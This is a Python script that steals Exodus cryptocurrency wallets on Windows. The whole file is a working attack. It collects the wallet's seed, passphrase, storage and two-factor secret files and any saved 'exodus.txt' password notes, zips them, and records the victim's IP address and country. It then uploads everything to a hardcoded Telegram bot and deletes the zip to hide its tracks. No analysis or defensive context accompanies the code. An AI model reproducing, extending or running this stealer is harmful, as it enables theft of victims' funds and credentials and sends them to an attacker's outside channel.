import getpass
import os
from zipfile import ZipFile
import requests
from pyfiglet import *
def initialize():
    username = getpass.getuser()
    TOKEN = "5711014217:AAGm6ZmhZmgkxkHMAO2lpynlmkJYXXgrtb4"
    chat_id = "-690567594"
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    temp = os.getenv("TEMP")
    path = "C:\\Users\\" + username + "\\appdata\\roaming\\exodus\\"
    zip = "C:\\Users\\" + username + "\\appdata\\roaming\\" + username+ "-exodus.zip"
    exodus_pswd_file ="C:\\Users\\" + username + "\\Desktop\\exodus.txt"
    exodus_pswd_file_dwnload = "C:\\Users\\" + username + "\\Downloads\\exodus.txt"
    exodus_pswd_file_document ="C:\\Users\\" + username + "\\Documents\\exodus.txt"
    exo_conf = info = "C:\\Users\\" + username + "\\appdata\\roaming\\exodus\\exodus.conf.json"
    info = "C:\\Users\\" + username + "\\appdata\\roaming\\exodus\\exodus.wallet\\info.seco"
    passphrase = "C:\\Users\\" + username + "\\appdata\\roaming\\exodus\\exodus.wallet\\passphrase.json"
    seed = "C:\\Users\\" + username + "\\appdata\\roaming\\exodus\\exodus.wallet\\seed.seco"
    storage = "C:\\Users\\" + username + "\\appdata\\roaming\\exodus\\exodus.wallet\\storage.seco"
    twofactor = "C:\\Users\\" + username + "\\appdata\\roaming\\exodus\\exodus.wallet\\twofactor.seco"
    twofactor_secret = "C:\\Users\\" + username + "\\appdata\\roaming\\exodus\\exodus.wallet\\twofactor-secret.seco"
    message = "[🧟] +1 Wallet Exodus from " + username +" %FLAG%\n"
    exodus_exist = False
    if os.path.exists(path) or os.path.exists(exodus_pswd_file) or os.path.exists(exodus_pswd_file_dwnload) or os.path.exists(exodus_pswd_file_document):
        exodus_exist = True
        with ZipFile(zip, "w") as newzip:
            try:
                newzip.write(info)
            except:
                pass
            try:  
                newzip.write(passphrase)
            except:
                pass
            try:
                newzip.write(seed)
            except:
                pass
            try:
                newzip.write(storage)
            except:
                pass
            try:
                newzip.write(twofactor)
            except:
                pass
            try:
                newzip.write(twofactor_secret)
            except:
                pass
            try:
                newzip.write(exo_conf)
            except:
                pass
            finally:
                message = message + f"\n🪪 Connect File has been added "
            try:
                newzip.write(exodus_pswd_file)
                message = message + f"\n |-✅ Interesting Desktop File has been added "
            except:
                pass
            try:
                newzip.write(exodus_pswd_file_dwnload)
                message = message + f"\n |-✅ Interesting Download File has been added "
            except:
                pass
            try:
                newzip.write(exodus_pswd_file_document)
                message = message + f"\n |-✅ Interesting Documents File has been added "
            except:
                pass
    if exodus_exist:
        adressip = "\n\n[🌎] AdressIP : "+ requests.get("http://ip-api.com/line/?fields=query").text
        countrycode = requests.get("http://ip-api.com/line/?fields=countryCode").text
        message = message + adressip
        countryflag_list = []
        for i in countrycode:
            countryflag_list.append(chr(int(ord(i)) + 127397))
        countryflag = ''.join(countryflag_list)
        message = message.replace("%FLAG%", countryflag)
        txt = open(zip , 'rb')
        requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage', json={'chat_id': chat_id, 'text': message})
        #requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={message}")
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={chat_id}", files={'document': txt})
        txt.close()
        try:
            if os.path.exists(zip):
                os.remove(zip)
        except:
            pass
